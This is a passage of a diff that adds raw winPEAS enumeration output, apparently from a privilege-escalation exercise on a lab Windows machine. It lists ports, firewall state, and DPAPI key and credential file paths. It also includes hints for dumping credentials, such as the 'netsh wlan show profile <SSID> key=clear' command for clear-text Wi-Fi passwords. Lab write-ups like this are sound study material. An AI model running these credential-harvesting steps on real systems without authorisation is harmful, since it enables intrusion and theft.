+    TCP       [::]:49666                                    Listening
+    TCP       [::]:49667                                    Listening
+    TCP       [::]:49668                                    Listening
+    TCP       [::]:49669                                    Listening
+    UDP       0.0.0.0:123                                   Listening
+    UDP       0.0.0.0:5050                                  Listening
+    UDP       0.0.0.0:5353                                  Listening
+    UDP       0.0.0.0:5355                                  Listening
+    UDP       10.10.10.198:137                              Listening
+    UDP       10.10.10.198:138                              Listening
+    UDP       10.10.10.198:1900                             Listening
+    UDP       10.10.10.198:51499                            Listening
+    UDP       [0m[1;31m127.0.0.1[0m:1900                                Listening
+    UDP       [0m[1;31m127.0.0.1[0m:51500                               Listening
+    UDP       [0m[1;31m127.0.0.1[0m:63869                               Listening
+    UDP       [::]:123                                      Listening
+    UDP       [::1]:1900                                    Listening
+    UDP       [::1]:51498                                   Listening
+    UDP       [fe80::989:26f2:f820:9629%10]:1900                       Listening
+    UDP       [fe80::989:26f2:f820:9629%10]:51497                       Listening
+
+[33m  [+] [1;32mFirewall Rules[33m([1;90mT1016[33m)[0m
+[33m   [?] [1;34mShowing only DENY rules (too many ALLOW rules always) [1;33m[0m
+    Current Profiles: PUBLIC
+    FirewallEnabled (Domain):    [0m[1;32mTrue[0m
+    FirewallEnabled (Private):    [0m[1;32mTrue[0m
+    FirewallEnabled (Public):    [0m[1;32mTrue[0m
+[1;90m    DENY rules:[0m
+
+[33m  [+] [1;32mDNS cached --limit 70--[33m([1;90mT1016[33m)[0m
+[1;90m    Entry                                 Name                                  Data[0m
+
+
+[1;36m  =========================================([0m[33mWindows Credentials[1;36m)=========================================[0m
+
+[33m  [+] [1;32mChecking Windows Vault[33m([1;90m[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mChecking Credential manager[33m([1;90m[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault[0m
+[1;90m    This function is not yet implemented.[0m
+[33m    [i] [1;34mIf you want to list credentials inside Credential Manager use 'cmdkey /list'[0m
+
+[33m  [+] [1;32mSaved RDP connections[33m([1;90m[33m)[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mRecently run commands[33m([1;90m[33m)[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mPS default transcripts history[33m([1;90m[33m)[0m
+[33m    [i] [1;34mRead the PS histpry inside these files (if any)[0m
+
+[33m  [+] [1;32mChecking for DPAPI Master Keys[33m([1;90m[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi[0m
+[1;37m    MasterKey: [0mC:\Users\shaun\AppData\Roaming\Microsoft\Protect\S-1-5-21-2277156429-3381729605-2640630771-1001\1674c52f-3f3a-4f15-a3a5-caf2882e3795
+[1;37m    Accessed: [0m14/07/2020 13:41:19
+[1;37m    Modified: [0m14/07/2020 13:41:19
+[1;90m   =================================================================================================[0m
+
+[1;37m    MasterKey: [0mC:\Users\shaun\AppData\Roaming\Microsoft\Protect\S-1-5-21-2277156429-3381729605-2640630771-1001\1732919c-1e88-4903-a608-88b2564bf090
+[1;37m    Accessed: [0m16/06/2020 15:09:16
+[1;37m    Modified: [0m16/06/2020 15:09:16
+[1;90m   =================================================================================================[0m
+
+
+[33m  [+] [1;32mChecking for Credential Files[33m([1;90m[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi[0m
+[1;37m    CredFile: [0mC:\Users\shaun\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
+[1;37m    Description: [0mLocal Credential Data  
+[1;37m    MasterKey: [0m1732919c-1e88-4903-a608-88b2564bf090
+[1;37m    Accessed: [0m22/07/2020 17:23:10
+[1;37m    Modified: [0m16/06/2020 22:20:29
+[1;37m    Size: [0m11152
+[1;90m   =================================================================================================[0m
+
+[33m    [i] [1;34mFollow the provided link for further instructions in how to decrypt the creds file[0m
+
+[33m  [+] [1;32mChecking for RDCMan Settings Files[33m([1;90m[33m)[0m
+[33m   [?] [1;34mDump credentials from Remote Desktop Connection Manager [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mLooking for kerberos tickets[33m([1;90m[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/pentesting/pentesting-kerberos-88[0m
+[1;90m  [X] Exception: Object reference not set to an instance of an object.[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mLooking saved Wifis[33m([1;90m[33m)[0m
+[1;90m    This function is not yet implemented.[0m
+[33m    [i] [1;34mIf you want to list saved Wifis connections you can list the using 'netsh wlan show profile'[0m
+[33m    [i] [1;34mIf you want to get the clear-text password use 'netsh wlan show profile <SSID> key=clear'[0m
+
+[33m  [+] [1;32mLooking AppCmd.exe[33m([1;90m[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mLooking SSClient.exe[33m([1;90m[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mChecking AlwaysInstallElevated[33m([1;90mT1012[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated[0m
+[1;32m    AlwaysInstallElevated isn't available[0m
+
+[33m  [+] [1;32mChecking WSUS[33m([1;90mT1012[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus[0m
+[1;90m    Not Found[0m
+
+
+[1;36m  ========================================([0m[33mBrowsers Information[1;36m)========================================[0m
+
+[33m  [+] [1;32mLooking for Firefox DBs[33m([1;90mT1503[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mLooking for GET credentials in Firefox history[33m([1;90mT1503[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mLooking for Chrome DBs[33m([1;90mT1503[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mLooking for GET credentials in Chrome history[33m([1;90mT1503[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mChrome bookmarks[33m([1;90mT1217[33m)[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mCurrent IE tabs[33m([1;90mT1503[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history[0m
+[1;90m  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
+   --- End of inner exception stack trace ---
+   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
+   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
+   at winPEAS.KnownFileCredsInfo.GetCurrentIETabs()[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mLooking for GET credentials in IE history[33m([1;90mT1503[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history[0m
+
+[33m  [+] [1;32mIE favorites[33m([1;90mT1217[33m)[0m
+    http://go.microsoft.com/fwlink/p/?LinkId=255142
+
+
+[1;36m  ==============================([0m[33mInteresting files and registry[1;36m)==============================[0m
+
+[33m  [+] [1;32mPutty Sessions[33m([1;90m[33m)[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mPutty SSH Host keys[33m([1;90m[33m)[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mSSH keys in registry[33m([1;90m[33m)[0m
+[33m   [?] [1;34mIf you find anything here, follow the link to learn how to decrypt the SSH keys [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mCloud Credentials[33m([1;90mT1538&T1083&T1081[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mUnnattend Files[33m([1;90m[33m)[0m
+
+[33m  [+] [1;32mLooking for common SAM & SYSTEM backups[33m([1;90m[33m)[0m
+
+[33m  [+] [1;32mLooking for McAfee Sitelist.xml Files[33m([1;90m[33m)[0m
+
+[33m  [+] [1;32mCached GPP Passwords[33m([1;90m[33m)[0m
+  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.
+
+[33m  [+] [1;32mLooking for possible regs with creds[33m([1;90mT1012&T1214[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry[0m
+[1;90m    Not Found[0m
+[1;90m    Not Found[0m
+[1;90m    Not Found[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mLooking for possible password files in users homes[33m([1;90mT1083&T1081[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files[0m
+    C:\Users\All Users\Microsoft\UEV\InboxTemplates\Roaming[0m[1;31mCredential[0mSettings.xml
+
+[33m  [+] [1;32mLooking inside the Recycle Bin for creds files[33m([1;90mT1083&T1081&T1145[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mSearching known files that can contain creds in home[33m([1;90mT1083&T1081[33m)[0m
+[33m   [?] [1;34m [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files[0m
+
+[33m  [+] [1;32mLooking for documents --limit 100--[33m([1;90mT1083[33m)[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mRecent files --limit 70--[33m([1;90mT1083&T1081[33m)[0m
+[1;90m    Not Found[0m
